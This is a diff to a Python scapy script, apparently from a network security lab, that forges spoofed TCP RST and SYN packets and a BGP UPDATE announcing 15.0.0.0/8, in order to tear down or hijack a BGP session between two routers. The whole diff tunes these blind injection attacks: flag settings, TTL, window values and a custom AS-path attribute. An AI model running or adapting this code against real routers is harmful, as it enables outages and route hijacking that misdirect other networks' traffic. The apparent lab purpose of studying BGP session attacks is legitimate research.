@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 
-import termcolor as T # grey red green yellow blue magenta cyan white
 import os
 import sys
 import ctypes
@@ -10,26 +9,37 @@ from subprocess import Popen, PIPE
 from scapy.all import *
 from random import randint
 from utils import log, log2
+from custom_classes import CustomBGPPathAttribute
 
 load_contrib("bgp")
 
 
 SOURCE_ADDRESS = '9.0.1.2'
 DESTINATION_ADDRESS = '9.0.1.1'
-SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
+BLIND_RST_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
+BLIND_SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
+BLIND_DATA_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
 
 
 def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
-	log('Sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
+	log('Sending TCP RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
-	tcp = TCP(flags="RA")
+	# conf 1
+	#tcp = TCP(flags="RA")
+	#tcp.ack=int(ackNum)
+	
+	# conf 2
+	tcp = TCP(flags="R")
+	tcp.ack=0
+
+	# conf 1 and conf 2 works in the same way
+
 	tcp.sport=int(srcPort)
 	tcp.dport=int(dstPort)
 	tcp.seq=int(seqNum)
-	tcp.ack=int(ackNum)
 	tcp.window=int(win)
 
-	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
+	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp
 
 	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
 
@@ -39,7 +49,7 @@ def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 
 
 def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
-	log('Sending SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
+	log('Sending TCP SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	# swapping ports
 	srcPort, dstPort = dstPort, srcPort
@@ -61,18 +71,21 @@ def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 
 
 def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
+	log('Sending BGP UPDATE packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	srcPort=int(srcPort)
 	dstPort=int(dstPort)
 	seqNum=int(seqNum)
 	ackNum=int(ackNum)
+	win=int(win)
 
 	paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')
 
 	# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
 	#paAS = BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x00\x03')
-	paAS = BGPPathAttribute(flags = 0x50, type = 2, attr_len = 6, value = '\x02\x01\x00\x00\x00\x03')
-
+	# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
+	paAS = CustomBGPPathAttribute(flags = 0x50, type = 2, attr_len = 6, value = '\x02\x01\x00\x00\x00\x03')
+	
 	# Path Next Hop [IP (9.0.1.2)]
 	paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x09\x00\x01\x02')
 
@@ -82,7 +95,7 @@ def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, se
 	paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(8 , '15.0.0.0')])
 
 	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 255)/\
-		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum)/\
+		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum, window = win)/\
 		BGPHeader(len = 53, type = 2)/\
 		paBGPU
 
@@ -227,19 +240,19 @@ def main():
 	sys.stdout.flush()
 
 	iface = 'atk1-eth0'
+	collect_time = 0
 
 	if choice == 1:
 		send_rst_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+		collect_time = BLIND_RST_ATTACK_COLLECT_TIME
 	elif choice == 2:
 		send_syn_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+		collect_time = BLIND_SYN_ATTACK_COLLECT_TIME
 	else:
 		send_update_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+		collect_time = BLIND_DATA_ATTACK_COLLECT_TIME
 
-	sys.stdout.flush()
-
-	# keeping capturing packets
-	log2('packets collection', SYN_ATTACK_COLLECT_TIME, 'red')
-
+	log2('packets collection', collect_time, 'red')
 	log('Packets collected', 'red')
 	log('Check pcap capture files', 'red')
 
